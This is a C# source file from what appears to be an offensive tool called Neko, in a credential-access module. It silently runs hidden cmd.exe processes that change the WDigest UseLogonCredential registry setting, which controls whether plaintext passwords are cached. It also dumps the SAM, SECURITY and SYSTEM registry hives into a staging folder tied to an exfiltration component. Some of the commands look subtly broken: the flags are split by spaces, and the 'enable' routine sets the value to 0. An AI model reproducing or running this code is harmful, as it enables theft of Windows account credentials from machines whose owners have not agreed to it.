using System;
using System.Diagnostics;

namespace Neko.Credential_Access
{
    class Selections
    {
        // Enable WDigest
        public static void EnableWDigest()
        {
            try
            {
                // Start new process
                Process RegProcess = new Process();
                // Configure process
                ProcessStartInfo RegConfig = new ProcessStartInfo();
                RegConfig.WindowStyle = ProcessWindowStyle.Hidden;
                RegConfig.CreateNoWindow = true;
                RegConfig.FileName = "cmd.exe";
                // Enable reading output
                RegConfig.RedirectStandardOutput = true;
                RegConfig.RedirectStandardError = true;
                RegConfig.UseShellExecute = false;
                RegProcess.StartInfo.Verb = "runas";
                // Pass arguments
                RegProcess.StartInfo = RegConfig;
                RegConfig.Arguments = @"/c reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest / v UseLogonCredential / t REG_DWORD / d 0";
                RegProcess.Start();
                string RegResult = RegProcess.StandardOutput.ReadToEnd();
                string REgErr = RegProcess.StandardError.ReadToEnd();

                Console.WriteLine(RegResult + REgErr + Environment.NewLine);
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }

        // Save SAM and Security registry info
        public static void SaveSAMSecurity()
        {
            try
            {
                string[] arguments = new string[3];
                arguments[0] = @"/c reg save hklm\security " + Exfiltration.SaveLocations.NekoFolder + "\\security.save";
                arguments[1] = @"/c reg save hklm\sam " + Exfiltration.SaveLocations.NekoFolder + "\\sam.save";
                arguments[2] = @"/c reg save hklm\system " + Exfiltration.SaveLocations.NekoFolder + "\\system.save";

                foreach (string command in arguments)
                {
                    // Start new process
                    Process RegProcess = new Process();
                    // Configure process
                    ProcessStartInfo RegConfig = new ProcessStartInfo();
                    RegConfig.WindowStyle = ProcessWindowStyle.Hidden;
                    RegConfig.CreateNoWindow = true;
                    RegConfig.FileName = "cmd.exe";
                    // Enable reading output
                    RegConfig.RedirectStandardOutput = true;
                    RegConfig.RedirectStandardError = true;
                    RegConfig.UseShellExecute = false;
                    RegProcess.StartInfo.Verb = "runas";
                    // Pass arguments
                    RegProcess.StartInfo = RegConfig;
                    RegConfig.Arguments = command;
                    RegProcess.Start();
                    string RegResult = RegProcess.StandardOutput.ReadToEnd();
                    string REgErr = RegProcess.StandardError.ReadToEnd();

                    Console.WriteLine(RegResult + REgErr + Environment.NewLine);
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }
        }
    }
}
